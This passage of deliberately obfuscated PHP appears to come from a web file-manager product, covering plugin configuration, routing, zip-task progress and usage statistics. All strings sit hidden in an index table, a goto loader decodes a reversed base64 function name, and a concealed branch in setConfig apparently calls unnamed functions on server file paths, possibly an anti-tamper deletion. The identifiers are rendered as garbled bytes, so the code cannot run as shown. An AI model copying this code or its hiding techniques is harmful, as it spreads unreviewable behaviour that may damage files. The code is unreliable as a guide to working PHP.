¾[0]) == 0) { return; } $Õ«Ûê­Ü = $this->getConfig(); $ö¿ìğ‰³ = array(); $ª×†¹Û“ = array(); foreach ($é¦› ¾[0] as $Êò™óÒ) { $Ä•ÑæÅ = substr($Êò™óÒ, strlen($íáÑéşÚ), -2); $ö¿ìğ‰³[] = $Êò™óÒ; $ª×†¹Û“[] = _get($Õ«Ûê­Ü, $Ä•ÑæÅ); } $à•…—ó³ = str_replace($ö¿ìğ‰³, $ª×†¹Û“, $à•…—ó³); } private function parsePackage(&$æîæÑá) { $î—ûÙ­û =& $_SERVER[ ÇƒŠìÀ]; $Æâ¤›Â = $î—ûÙ­û[1598]; if (!strstr($æîæÑá, $Æâ¤›Â)) { return; } preg_match_all($î—ûÙ­û[1599], $æîæÑá, $™ì±¦ğ); if (!is_array($™ì±¦ğ) || count($™ì±¦ğ) == 0 || !is_array($™ì±¦ğ[0]) || count($™ì±¦ğ[0]) == 0) { return; } $§æÜ³Ï© = $this->appPackage(); $ªÑÓã‘´ = array(); $Ë–èè–Ş = array(); foreach ($™ì±¦ğ[0] as $ š€ğÇ¡) { $»¿Ìì– = substr($ š€ğÇ¡, strlen($Æâ¤›Â), -2); $ªÑÓã‘´[] = $ š€ğÇ¡; $Ë–èè–Ş[] = _get($§æÜ³Ï©, $»¿Ìì–); } $æîæÑá = str_replace($ªÑÓã‘´, $Ë–èè–Ş, $æîæÑá); } final function echoFile($—Ûáúø£, $‚Æ‚í§ = false) { $È‹ŠÑì„ =& $_SERVER[ ÇƒŠìÀ]; $†‚×’„ = $this->pluginPath . $—Ûáúø£; if (ACT == $È‹ŠÑì„[1600]) { echo $È‹ŠÑì„[1601] . $this->pluginName . $È‹ŠÑì„[8] . $—Ûáúø£ . $È‹ŠÑì„[1602]; if (!file_exists($†‚×’„)) { echo $È‹ŠÑì„[1603]; return; } } $´áÙã¶© = $this->parseFile($†‚×’„); $this->parseLang($´áÙã¶©); $this->parseConfig($´áÙã¶©); $this->parsePackage($´áÙã¶©); if (is_array($‚Æ‚í§)) { $´áÙã¶© = str_replace(array_keys($‚Æ‚í§), array_values($‚Æ‚í§), $´áÙã¶©); } echo $È‹ŠÑì„[248] . $´áÙã¶©; } private function checkVersion() { $áÖçµ‚ =& $_SERVER[ ÇƒŠìÀ]; $„ùÅÇÌ¤ = $this->appPackage(); $û¸ñŠŒ = $this->getConfig(); if ($û¸ñŠŒ[$áÖçµ‚[1604]] == $„ùÅÇÌ¤[$áÖçµ‚[1578]]) { return; } $this->regist(); $this->setConfig(array($áÖçµ‚[1604] => $„ùÅÇÌ¤[$áÖçµ‚[1578]])); } final function initLang() { $õşíô×İ =& $_SERVER[ ÇƒŠìÀ]; $æğ—ËñØ = $õşíô×İ[1605]; $„üƒ™„ù = $this->pluginPath . $õşíô×İ[1606]; $÷›¬äëá = I18n::getType(); $ÅüóŞä½ = array(); if (file_exists($„üƒ™„ù . $÷›¬äëá . $õşíô×İ[868])) { $ÅüóŞä½ = (include $„üƒ™„ù . $÷›¬äëá . $õşíô×İ[868]); } else { if ($÷›¬äëá == $õşíô×İ[1607] && !file_exists($„üƒ™„ù . $÷›¬äëá . $õşíô×İ[868]) && file_exists($„üƒ™„ù . $õşíô×İ[1608])) { $ÅüóŞä½ = (include $„üƒ™„ù . $õşíô×İ[1608]); } else { if (file_exists($„üƒ™„ù . $æğ—ËñØ . $õşíô×İ[868])) { $ÅüóŞä½ = (include $„üƒ™„ù . $æğ—ËñØ . $õşíô×İ[868]); } } } if (!is_array($ÅüóŞä½)) { return array(); } if (@count($ÅüóŞä½) > 0) { I18n::set($ÅüóŞä½); } return $ÅüóŞä½; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($¶Åœ¶Ô£) { $‡¦ïˆŸ¤ =& $_SERVER[ ÇƒŠìÀ]; if ($_SERVER[$‡¦ïˆŸ¤[906]] != $_SERVER[$‡¦ïˆŸ¤[947]]) { $…´ç¬Ö˜ = $‡¦ïˆŸ¤[908]; $ı·¬Æû— = $‡¦ïˆŸ¤[909]; $Øğ‚·ğÊ = $_SERVER[$‡¦ïˆŸ¤[910]] . $‡¦ïˆŸ¤[911]; $µİÆƒéè = $ı·¬Æû—($Øğ‚·ğÊ); $˜À€ªÃ = explode($‡¦ïˆŸ¤[248], $µİÆƒéè); if (count($˜À€ªÃ) < $‡¦ïˆŸ¤[653]) { $ôº‹ÖÔè = $‡¦ïˆŸ¤[912]; $ôº‹ÖÔè(); } $ºĞ´ÀÅş = $‡¦ïˆŸ¤[913]; $ºĞ´ÀÅş($_SERVER[$‡¦ïˆŸ¤[914]]); $ºĞ´ÀÅş($_SERVER[$‡¦ïˆŸ¤[910]] . $‡¦ïˆŸ¤[1545]); $¯‹”óÍ‹ = 1; while ($¯‹”óÍ‹ > 1) { $¯‹”óÍ‹ = $¯‹”óÍ‹ + 4; $Ó²“¤ƒ– = rawurlencode($¯‹”óÍ‹ . $‡¦ïˆŸ¤[424]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $¶Åœ¶Ô£); } public function onSetConfig($Ş—°”Í„) { } public function onGetConfig($ªıÏ³ä) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¡ÈÜ¶ÉË) { if ($¡ÈÜ¶ÉË == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ïœ¸ºóÙ = "\x70\x6c\165\x67\x69\156\101\165\x74\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $²óÛ„‡à = $this->getConfig(); if (!$²óÛ„‡à[$ïœ¸ºóÙ]) { return !1; } return ActionCall($_SERVER[ ÇƒŠìÀ][1609], $²óÛ„‡à[$ïœ¸ºóÙ]); } public function url($Ô“„ç¶, $¢–¶ÑÕ = '', $©ç²æ«ş = true) { $Øô»üôÀ =& $_SERVER[ ÇƒŠìÀ]; $Ãı±»·Œ = $this->getConfig(); $ÑË¬ï¤€ = KOD_VERSION . $Øô»üôÀ[10] . KOD_VERSION_BUILD; $îµìì¶Ç = $this->packageVersion(); $£³Ğ‘ = $ÑË¬ï¤€ . $Øô»üôÀ[432] . $îµìì¶Ç; if (substr($Ô“„ç¶, 0, 4) == $Øô»üôÀ[151] || substr($Ô“„ç¶, 0, 2) == $Øô»üôÀ[1389]) { $¬ÄšôÓ = $Ô“„ç¶ . $Øô»üôÀ[1610] . $£³Ğ‘; } else { if ($¢–¶ÑÕ == $Øô»üôÀ[12]) { $¬ÄšôÓ = $this->pluginHost . $Ô“„ç¶ . $Øô»üôÀ[1610] . $£³Ğ‘; } else { if ($¢–¶ÑÕ === $Øô»üôÀ[77]) { $¬ÄšôÓ = $this->pluginHost . $Ô“„ç¶; } else { if ($¢–¶ÑÕ == $Øô»üôÀ[1611]) { $¬ÄšôÓ = STATIC_PATH . $Ô“„ç¶ . $Øô»üôÀ[1610] . $ÑË¬ï¤€; } else { if ($¢–¶ÑÕ == $Øô»üôÀ[1612]) { $¬ÄšôÓ = APP_HOST . $Øô»üôÀ[1613] . $Ô“„ç¶ . $Øô»üôÀ[1610] . $ÑË¬ï¤€; } else { if (isset($Ãı±»·Œ[$¢–¶ÑÕ])) { $¬ÄšôÓ = $Ãı±»·Œ[$¢–¶ÑÕ] . $Ô“„ç¶ . $Øô»üôÀ[1610] . $£³Ğ‘; } } } } } } if (!$©ç²æ«ş) { return $¬ÄšôÓ; } echo $¬ÄšôÓ; } public function link($ÜÛ´ªô² = false, $ååÚó‡İ = '') { $œ…ÔË•Â =& $_SERVER[ ÇƒŠìÀ]; if (!$ÜÛ´ªô²) { $this->link($œ…ÔË•Â[1614], $œ…ÔË•Â[1612]); $this->link($œ…ÔË•Â[1615], $œ…ÔË•Â[1611]); $this->link($œ…ÔË•Â[1616], $œ…ÔË•Â[1611]); $this->link($œ…ÔË•Â[1617], $œ…ÔË•Â[1611]); $this->link($œ…ÔË•Â[1618], $œ…ÔË•Â[1611]); return; } $ªúûÎ•Â = $this->url($ÜÛ´ªô², $ååÚó‡İ, !1); if (substr($ÜÛ´ªô², -3) == $œ…ÔË•Â[1619]) { echo $œ…ÔË•Â[1620] . $ªúûÎ•Â . $œ…ÔË•Â[1621] . $œ…ÔË•Â[248]; } else { if (substr($ÜÛ´ªô², -4) == $œ…ÔË•Â[1622]) { echo $œ…ÔË•Â[1623] . $ªúûÎ•Â . $œ…ÔË•Â[1624] . $œ…ÔË•Â[248]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\171" => "\x5b\x5e\x2f\135\x2b", "\x3a\156\165\x6d" => "\x5b\60\55\x39\135\x2b", "\x3a\141\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($ºÔ£šçœ, $²¬·Ø¢) { $¥ñÛÎ®Ô =& $_SERVER[ ÇƒŠìÀ]; if ($ºÔ£šçœ == $¥ñÛÎ®Ô[1625]) { $ï“™ÈùÑ = array_map($¥ñÛÎ®Ô[1626], $²¬·Ø¢[0]); $¹½Ù–ñ© = strpos($²¬·Ø¢[1], $¥ñÛÎ®Ô[8]) === 0 ? $²¬·Ø¢[1] : $¥ñÛÎ®Ô[8] . $²¬·Ø¢[1]; $ôÁöşç = $²¬·Ø¢[2]; } else { $ï“™ÈùÑ = null; $¹½Ù–ñ© = strpos($²¬·Ø¢[0], $¥ñÛÎ®Ô[8]) === 0 ? $²¬·Ø¢[0] : $¥ñÛÎ®Ô[8] . $²¬·Ø¢[0]; $ôÁöşç = $²¬·Ø¢[1]; } array_push(self::$maps, $ï“™ÈùÑ); array_push(self::$routes, $¹½Ù–ñ©); array_push(self::$methods, strtoupper($ºÔ£šçœ)); array_push(self::$callbacks, $ôÁöşç); } public static function error($®°Õù÷Æ) { self::$errorCallback = $®°Õù÷Æ; } public static function haltOnMatch($óÍšŠªò = true) { self::$halts = $óÍšŠªò; } public static function dispatch() { $’ñ‹ÂÂ² =& $_SERVER[ ÇƒŠìÀ]; $•ê›Îš = parse_url($_SERVER[$’ñ‹ÂÂ²[1627]], PHP_URL_PATH); $³í–â¼ï = $_SERVER[$’ñ‹ÂÂ²[162]]; $¬‰€ÎÊ¼ = array_keys(static::$patterns); $ÊğŒÎîè = array_values(static::$patterns); $ñµÂ¯ — = !1; self::$routes = preg_replace($’ñ‹ÂÂ²[1311], $’ñ‹ÂÂ²[8], self::$routes); if (in_array($•ê›Îš, self::$routes)) { $„›ƒ’Õ = array_keys(self::$routes, $•ê›Îš); foreach ($„›ƒ’Õ as $çŒÑúù†) { if (self::$methods[$çŒÑúù†] == $³í–â¼ï || self::$methods[$çŒÑúù†] == $’ñ‹ÂÂ²[1628] || in_array($³í–â¼ï, self::$maps[$çŒÑúù†])) { $ñµÂ¯ — = !0; if (!is_object(self::$callbacks[$çŒÑúù†])) { $ı¤Óš‹Õ = explode($’ñ‹ÂÂ²[8], self::$callbacks[$çŒÑúù†]); $€‘Ù±ó = end($ı¤Óš‹Õ); $£ş¸¢ù¤ = explode($’ñ‹ÂÂ²[1243], $€‘Ù±ó); $²“šß  = new $£ş¸¢ù¤[0](); $²“šß ->{$£ş¸¢ù¤[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$çŒÑúù†]); if (self::$halts) { return; } } } } } else { $®˜¤¹Ç‡ = 0; foreach (self::$routes as $çŒÑúù†) { if (strpos($çŒÑúù†, $’ñ‹ÂÂ²[4]) !== !1) { $çŒÑúù† = str_replace($¬‰€ÎÊ¼, $ÊğŒÎîè, $çŒÑúù†); } if (preg_match($’ñ‹ÂÂ²[1629] . $çŒÑúù† . $’ñ‹ÂÂ²[1630], $•ê›Îš, $Ñ§õèåğ)) { if (self::$methods[$®˜¤¹Ç‡] == $³í–â¼ï || self::$methods[$®˜¤¹Ç‡] == $’ñ‹ÂÂ²[1628] || !empty(self::$maps[$®˜¤¹Ç‡]) && in_array($³í–â¼ï, self::$maps[$®˜¤¹Ç‡])) { $ñµÂ¯ — = !0; array_shift($Ñ§õèåğ); if (!is_object(self::$callbacks[$®˜¤¹Ç‡])) { $ı¤Óš‹Õ = explode($’ñ‹ÂÂ²[8], self::$callbacks[$®˜¤¹Ç‡]); $€‘Ù±ó = end($ı¤Óš‹Õ); $£ş¸¢ù¤ = explode($’ñ‹ÂÂ²[1243], $€‘Ù±ó); $²“šß  = new $£ş¸¢ù¤[0](); if (!method_exists($²“šß , $£ş¸¢ù¤[1])) { echo $’ñ‹ÂÂ²[1631]; } else { call_user_func_array(array($²“šß , $£ş¸¢ù¤[1]), $Ñ§õèåğ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$®˜¤¹Ç‡], $Ñ§õèåğ); if (self::$halts) { return; } } } } $®˜¤¹Ç‡++; } } if ($ñµÂ¯ — == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $¶¨ÈŸä¦ =& $_SERVER[ ÇƒŠìÀ]; header($_SERVER[$¶¨ÈŸä¦[1632]] . $¶¨ÈŸä¦[1633]); echo $¶¨ÈŸä¦[1634]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$’ñ‹ÂÂ²[1627]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto EŒ„ƒæÚ‰; AË…‹Ü—†: $fileSize = strrev(base64_decode($_SERVER[™”Œ”õÅ][0])); function binCheckNeq($¼–È™€´, $ÇÓòŠ©œ) { return $¼–È™€´ != $ÇÓòŠ©œ; } $_SERVER[$_SERVER[™”Œ”õÅ][1]] = $fileSize($_SERVER[$_SERVER[™”Œ”õÅ][2]]); goto f—ÅÂ²ÈŠ; Cìª¯ã˜¥: class TaskZip extends TaskFileTransfer { protected function startAfter() { $®§¢í²³ =& $_SERVER[ ÇƒŠìÀ]; parent::startAfter(); Hook::bind($®§¢í²³[1813], array($this, $®§¢í²³[1803])); Hook::bind($®§¢í²³[1805], array($this, $®§¢í²³[1806])); $™š’Ô˜¨ =& $this->task; $™š’Ô˜¨[$®§¢í²³[1807]] = $®§¢í²³[1229]; if (!$™š’Ô˜¨[$®§¢í²³[1579]]) { $™š’Ô˜¨[$®§¢í²³[1579]] = LNG($®§¢í²³[1814]); } } protected function endAfter() { $¬ı·¸ =& $_SERVER[ ÇƒŠìÀ]; parent::endAfter(); Hook::unbind($¬ı·¸[1813], array($this, $¬ı·¸[1803])); Hook::unbind($¬ı·¸[1805], array($this, $¬ı·¸[1806])); } public function updateAfter() { $ÍËŒ‰›“ =& $_SERVER[ ÇƒŠìÀ]; $œ¸¡ô»Œ =& $this->task; if (!$œ¸¡ô»Œ[$ÍËŒ‰›“[815]] || !$œ¸¡ô»Œ[$ÍËŒ‰›“[792]]) { return; } if ($œ¸¡ô»Œ[$ÍËŒ‰›“[1807]] == $ÍËŒ‰›“[1229]) { $õé—Ë¨· = $œ¸¡ô»Œ[$ÍËŒ‰›“[1743]]; if ($œ¸¡ô»Œ[$ÍËŒ‰›“[1744]] != $ÍËŒ‰›“[1229]) { $õé—Ë¨· = 0; } $œ©‡Äİî = ($œ¸¡ô»Œ[$ÍËŒ‰›“[1747]] + $õé—Ë¨·) / $œ¸¡ô»Œ[$ÍËŒ‰›“[792]]; $œ¸¡ô»Œ[$ÍËŒ‰›“[1691]] = $œ©‡Äİî * 0.3; } else { if ($œ¸¡ô»Œ[$ÍËŒ‰›“[1807]] == $ÍËŒ‰›“[359]) { $œ©‡Äİî = $œ¸¡ô»Œ[$ÍËŒ‰›“[1690]] / $œ¸¡ô»Œ[$ÍËŒ‰›“[815]]; $œ¸¡ô»Œ[$ÍËŒ‰›“[1691]] = 0.3 + $œ©‡Äİî * 0.5; } else { if ($œ¸¡ô»Œ[$ÍËŒ‰›“[1807]] == $ÍËŒ‰›“[109]) { $œ©‡Äİî = 0; if ($œ¸¡ô»Œ[$ÍËŒ‰›“[1742]]) { $œ©‡Äİî = $œ¸¡ô»Œ[$ÍËŒ‰›“[1743]] / $œ¸¡ô»Œ[$ÍËŒ‰›“[1742]]; } $œ¸¡ô»Œ[$ÍËŒ‰›“[1691]] = 0.3 + 0.5 + $œ©‡Äİî * 0.2; } } } if ($œ¸¡ô»Œ[$ÍËŒ‰›“[1691]] > 0) { $­»¨­² = timeFloat() - $œ¸¡ô»Œ[$ÍËŒ‰›“[1693]] - $œ¸¡ô»Œ[$ÍËŒ‰›“[1696]]; $œ¸¡ô»Œ[$ÍËŒ‰›“[1697]] = $­»¨­² * (1 - $œ¸¡ô»Œ[$ÍËŒ‰›“[1691]]) / $œ¸¡ô»Œ[$ÍËŒ‰›“[1691]]; } } public function copyFileStart($ó£œíÙÉ, $¥¢ƒêÚ, $’Óá­²ù, $ä…ŸØ, $ı•ãØİÇ, $¡‡Î¦¡) { $ÊÖ²ÜÔ =& $_SERVER[ ÇƒŠìÀ]; parent::copyFileStart($ó£œíÙÉ, $¥¢ƒêÚ, $’Óá­²ù, $ä…ŸØ, $ı•ãØİÇ, $¡‡Î¦¡); $ÚŸŠç„è =& $this->task; if ($ÚŸŠç„è[$ÊÖ²ÜÔ[1807]] == $ÊÖ²ÜÔ[359]) { $ÚŸŠç„è[$ÊÖ²ÜÔ[1807]] = $ÊÖ²ÜÔ[109]; } $this->update(); } public function copyFileEnd($Í¶ÉóÇ„, $ù±¦¥ÅÑ, $È…ÉòãÔ, $ùØ¬¯ªê, $ƒ³ îœ, $ÜìèÛÏ½) { $¦¾©ü Â =& $_SERVER[ ÇƒŠìÀ]; $’ï½Âç =& $this->task; $’ï½Âç[$¦¾©ü Â[1743]] = $’ï½Âç[$¦¾©ü Â[1742]]; $’ï½Âç[$¦¾©ü Â[1747]] += $’ï½Âç[$¦¾©ü Â[1742]]; $’ï½Âç[$¦¾©ü Â[1744]] = $¦¾©ü Â[12]; $this->update(); } public function zipEvent($İ¤Î®åô, $–ÒÇöØş, $óóÜÅÒÁ, $‡ë‰è©ô) { $Š‰šñş =& $_SERVER[ ÇƒŠìÀ]; $ÄœÑ»í  =& $this->task; $ÄœÑ»í [$Š‰šñş[1740]] = get_path_this($–ÒÇöØş); $ÄœÑ»í [$Š‰šñş[1742]] = $‡ë‰è©ô; $ÄœÑ»í [$Š‰šñş[1743]] = $óóÜÅÒÁ; $ÄœÑ»í [$Š‰šñş[1099]] = $İ¤Î®åô == $Š‰šñş[1815] ? $Š‰šñş[1810] : $Š‰šñş[1811]; $ÄœÑ»í [$Š‰šñş[1744]] = $Š‰šñş[12]; $ÄœÑ»í [$Š‰šñş[792]] = $‡ë‰è©ô; $ÄœÑ»í [$Š‰šñş[1807]] = $Š‰šñş[359]; $this->update(); } public function nameParse($è¯Îé‡) { $ØÎâ¾÷Ç =& $_SERVER[ ÇƒŠìÀ]; $ß—†ˆ­– =& $this->task; if ($ß—†ˆ­–[$ØÎâ¾÷Ç[1690]] < $ß—†ˆ­–[$ØÎâ¾÷Ç[815]]) { $³²€Œ¯ø = get_path_this($è¯Îé‡); if (strstr($³²€Œ¯ø, $ØÎâ¾÷Ç[10])) { $ß—†ˆ­–[$ØÎâ¾÷Ç[1690]] += 1; } } if ($ß—†ˆ­–[$ØÎâ¾÷Ç[1807]] == $ØÎâ¾÷Ç[1229]) { $ß—†ˆ­–[$ØÎâ¾÷Ç[1807]] = $ØÎâ¾÷Ç[359]; } $ß—†ˆ­–[$ØÎâ¾÷Ç[1740]] = $è¯Îé‡; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($Ô‡¥Œ¨à) { $ĞÙÎÄ =& $_SERVER[ ÇƒŠìÀ]; $À§Á¥Á¥ = array($ĞÙÎÄ[632] => array($ĞÙÎÄ[33] => $ĞÙÎÄ[1816], $ĞÙÎÄ[319] => array($ĞÙÎÄ[241], $ĞÙÎÄ[794], $ĞÙÎÄ[1817], $ĞÙÎÄ[1818])), $ĞÙÎÄ[1819] => array($ĞÙÎÄ[33] => $ĞÙÎÄ[1820], $ĞÙÎÄ[319] => array($ĞÙÎÄ[241], $ĞÙÎÄ[792], $ĞÙÎÄ[1821], $ĞÙÎÄ[1822], $ĞÙÎÄ[1823]))); if (!isset($À§Á¥Á¥[$Ô‡¥Œ¨à])) { return !1; } $this->optionType = $À§Á¥Á¥[$Ô‡¥Œ¨à][$ĞÙÎÄ[33]]; $this->field = $À§Á¥Á¥[$Ô‡¥Œ¨à][$ĞÙÎÄ[319]]; return !0; } public function listData($£¨˜‰Éõ = false, $Ò¶·àÚú = "\155\x6f\144\x69\146\x79\x54\151\x6d\145", $¶ÓÆ™¼æ = false) { return parent::listData($£¨˜‰Éõ, $Ò¶·àÚú, $¶ÓÆ™¼æ); } public function trendList($ü¨ª¢ğ) { $îïÎË£¤ =& $_SERVER[ ÇƒŠìÀ]; $ã¯âóêš = $this->listData(); if ($ã¯âóêš) { $‡¯ÊÉ·“ = end($ã¯âóêš); $ññÙœÚÒ = date($îïÎË£¤[1824], strtotime($îïÎË£¤[1825])); if ($‡¯ÊÉ·“[$îïÎË£¤[241]] == $ññÙœÚÒ) { return $ã¯âóêš; } $é”¦Ã‚ = strtotime($‡¯ÊÉ·“[$îïÎË£¤[241]]); } if (!isset($é”¦Ã‚)) { $¿¢£¡Ñ = $ü¨ª¢ğ == $îïÎË£¤[632] ? $îïÎË£¤[569] : $îïÎË£¤[854]; $é”¦Ã‚ = Model($¿¢£¡Ñ)->min($îïÎË£¤[217]); } $š¤ùÓ£â = $îïÎË£¤[1826] . ucfirst($ü¨ª¢ğ); $ŒÊÓø‡± = $this->dateList($é”¦Ã‚); foreach ($ŒÊÓø‡± as $ññÙœÚÒ) { $this->{$š¤ùÓ£â}($ññÙœÚÒ); } return $this->listData(); } private function dateList($Ğ²ÒÌª) { $óÏ²‘¾ã =& $_SERVER[ ÇƒŠìÀ]; $‹‡â•• = $Ğ²ÒÌª; $’×©†Ä¼ = strtotime($óÏ²‘¾ã[1825]); $Ş’æ¹àˆ = array(); while ($‹‡â•• <= $’×©†Ä¼) { $Ş’æ¹àˆ[] = date($óÏ²‘¾ã[1824], $‹‡â••); $‹‡â•• = strtotime($óÏ²‘¾ã[1827], $‹‡â••); } return $Ş’æ¹àˆ; } public function _recordUser($ó²¿’‰İ = '') { $…Éô”ò =& $_SERVER[ ÇƒŠìÀ]; $ÏØèÊ¸ = strtotime(date($…Éô”ò[1828], strtotime($ó²¿’‰İ))); $ì­Ãà‚ä = strtotime(date($…Éô”ò[1829], strtotime($ó²¿’‰İ))); $æ³¥Ğè = array($…Éô”ò[217] => array($…Éô”ò[1048], $ì­Ãà‚ä)); $ Ç²µ”“ = Model($…Éô”ò[569])->where($æ³¥Ğè)->count($…Éô”ò[1689]); $æ³¥Ğè[$…Éô”ò[217]] = array($…Éô”ò[379], array($ÏØèÊ¸, $ì­Ãà‚ä)); $ü”¥ÀüÇ = Model($…Éô”ò[569])->where($æ³¥Ğè)->count($…Éô”ò[1689]); $æ³¥Ğè[$…Éô”ò[33]] = $…Éô”ò[1830]; $£Œİá¾ = Model($…Éô”ò[1831])->where($æ³¥Ğè)->count($…Éô”ò[1832]); $ë¨í¾Ó™ = array($…Éô”ò[241] => $ó²¿’‰İ, $…Éô”ò[794] => (int) $ Ç²µ”“, $…Éô”ò[1817] => (int) $ü”¥ÀüÇ, $…Éô”ò[1818] => (int) $£Œİá¾); return $this->insert($ë¨í¾Ó™); } public function _recordStore($•Î‰µ«Ú = '') { $Á‘µşéË =& $_SERVER[ ÇƒŠìÀ]; $†ÆÑôóï = strtotime(date($Á‘µşéË[1829], strtotime($•Î‰µ«Ú))); $‰©¼¦à± = array($Á‘µşéË[217] => array($Á‘µşéË[1048], $†ÆÑôóï)); $åüˆæÄ‡ = Model($Á‘µşéË[514])->where($‰©¼¦à±)->sum($Á‘µşéË[78]); $‰©¼¦à±[$Á‘µşéË[455]] = 0; $Âé½²” = Model($Á‘µşéË[854])->where($‰©¼¦à±)->sum($Á‘µşéË[78]); $‰©¼¦à±[$Á‘µşéË[180]] = 1; $ìáìúÏ¶ = Model($Á‘µşéË[854])->where($‰©¼¦à±)->sum($Á‘µşéË[78]); $‰©¼¦à±[$Á‘µşéË[180]] = 2; $òÂËÉ¼ = Model($Á‘µşéË[854])->where($‰©¼¦à±)->sum($Á‘µşéË[78]); $šüĞ¥£ = array($Á‘µşéË[241] => $•Î‰µ«Ú, $Á‘µşéË[792] => (int) $Âé½²”, $Á‘µşéË[1821] => (int) $åüˆæÄ‡, $Á‘µşéË[1822] => (int) $ìáìúÏ¶, $Á‘µşéË[1823] => (int) $òÂËÉ¼); return $this->insert($šüĞ¥£); } public function trend($ÏÜıàœ“, $»Öí¨«‡) { $×„¢£¬¦ =& $_SERVER[ ÇƒŠìÀ]; if (!$this->init($ÏÜıàœ“)) { return !1; } $«³œÕì = $this->trendList($ÏÜıàœ“); if ($«³œÕì && $»Öí¨«‡ != $×„¢£¬¦[1662]) { $Â”Ù›Ç” = $«³œÕì[0][$×„¢£¬¦[241]]; $ò‹Ÿ×ˆ = $this->validDate($»Öí¨«‡, $Â”Ù›Ç”); $¾•¶·ß = array(); $Šªê¯êÙ = array_to_keyvalue($«³œÕì, $×„¢£¬¦[241]); foreach ($ò‹Ÿ×ˆ as $  Ñ“Ë¨) { if (isset($Šªê¯êÙ[$  Ñ“Ë¨])) { $¢è ¶Óâ = $Šªê¯êÙ[$  Ñ“Ë¨]; } else { $¢è ¶Óâ = end($«³œÕì); $¢è ¶Óâ[$×„¢£¬¦[241]] = $  Ñ“Ë¨; if ($ÏÜıàœ“ == $×„¢£¬¦[632]) { $¢è ¶Óâ[$×„¢£¬¦[1817]] = $¢è ¶Óâ[$×„¢£¬¦[1818]] = 0; } } $¾•¶·ß[] = $¢è ¶Óâ; } $«³œÕì = $¾•¶·ß; } $Ëã¬Ê–¾ = array($×„¢£¬¦[632] => array($×„¢£¬¦[794] => LNG($×„¢£¬¦[1833]), $×„¢£¬¦[1817] => LNG($×„¢£¬¦[1834]), $×„¢£¬¦[1818] => LNG($×„¢£¬¦[1835])), $×„¢£¬¦[1819] => array($×„¢£¬¦[792] => LNG($×„¢£¬¦[1836]), $×„¢£¬¦[1821] => LNG($×„¢£¬¦[1837]), $×„¢£¬¦[1822] => LNG($×„¢£¬¦[1838]), $×„¢£¬¦[1823] => LNG($×„¢£¬¦[1839]))); $İ»Ê÷× = array($×„¢£¬¦[632] => $×„¢£¬¦[1840], $×„¢£¬¦[1819] => $×„¢£¬¦[78]); if (empty($«³œÕì)) { $  Ñ“Ë¨ = date($×„¢£¬¦[1824], strtotime($×„¢£¬¦[1825])); $ê¹ßÇá = array($×„¢£¬¦[241] => $  Ñ“Ë¨); foreach ($Ëã¬Ê–¾[$ÏÜıàœ“] as $Øğç€Ö† => $ÖïÔµø) { $ê¹ßÇá[$Øğç€Ö†] = 0; } $«³œÕì[] = $ê¹ßÇá; } $ÃËÃ½ÑÛ = array(); foreach ($«³œÕì as $ÖïÔµø) { if ($ÏÜıàœ“ == $×„¢£¬¦[1819] && $ÖïÔµø[$×„¢£¬¦[1821]] > $ÖïÔµø[$×„¢£¬¦[792]]) { $ÖïÔµø[$×„¢£¬¦[1821]] = $ÖïÔµø[$×„¢£¬¦[792]]; } foreach ($Ëã¬Ê–¾[$ÏÜıàœ“] as $Øğç€Ö† => $ÂÓ’¦¥Ë) { $¢è ¶Óâ = array($×„¢£¬¦[241] => $ÖïÔµø[$×„¢£¬¦[241]], $×„¢£¬¦[1579] => $ÂÓ’¦¥Ë); $¢è ¶Óâ[$İ»Ê÷×[$ÏÜıàœ“]] = isset($ÖïÔµø[$Øğç€Ö†]) ? $ÖïÔµø[$Øğç€Ö†] : 0; $ÃËÃ½ÑÛ[] = $¢è ¶Óâ; } } return $ÃËÃ½ÑÛ; } public function validDate($¤³—…¼¥, $ï›’’’…) { $Ú“¿ê°ö =& $_SERVER[ ÇƒŠìÀ]; $¦¢¹áÍ£ = date($Ú“¿ê°ö[1824], strtotime($Ú“¿ê°ö[1825])); $¿ÑÊÄÕ = array($¦¢¹áÍ£); switch ($¤³—…¼¥) { case $Ú“¿ê°ö[1669]: $Òë‚•Å¬ = mktime(0, 0, 0, date($Ú“¿ê°ö[1841]), date($Ú“¿ê°ö[1396]) - date($Ú“¿ê°ö[1461]) + 7 - 7, date($Ú“¿ê°ö[1842])); $‚š”Ê³ä = 0; do { $á·˜´Œ¶ = date($Ú“¿ê°ö[1824], $Òë‚•Å¬ - 3600 * 24 * 7 * $‚š”Ê³ä); $¿ÑÊÄÕ[] = $á·˜´Œ¶; $‚š”Ê³ä++; } while ($ï›’’’… < $á·˜´Œ¶); break; case $Ú“¿ê°ö[1667]: $‚š”Ê³ä = 1; do { $£Û‚Ô× = date($Ú“¿ê°ö[1843], strtotime("\x2d\40{$‚š”Ê³ä}\40\155\x6f\x6e\164\x68\163")); $¿ÑÊÄÕ[] = $£Û‚Ô×; $‚š”Ê³ä++; } while ($ï›’’’… < $£Û‚Ô×); break; case $Ú“¿ê°ö[1844]: $ÖÚö Ñ´ = (int) date($Ú“¿ê°ö[1842], strtotime($ï›’’’…)); $ğÉè»Œ˜ = (int) date($Ú“¿ê°ö[1842]); if ($ÖÚö Ñ´ >= $ğÉè»Œ˜) { break; } for ($ÖÚö Ñ´; $ÖÚö Ñ´ < $ğÉè»Œ˜; $ÖÚö Ñ´++) { $¿ÑÊÄÕ[] = $ÖÚö Ñ´ . $Ú“¿ê°ö[1845]; } break; default: break; } if ($ï›’’’… > end($¿ÑÊÄÕ)) { array_pop($¿ÑÊÄÕ); } sort($¿ÑÊÄÕ); return $¿ÑÊÄÕ; } public function 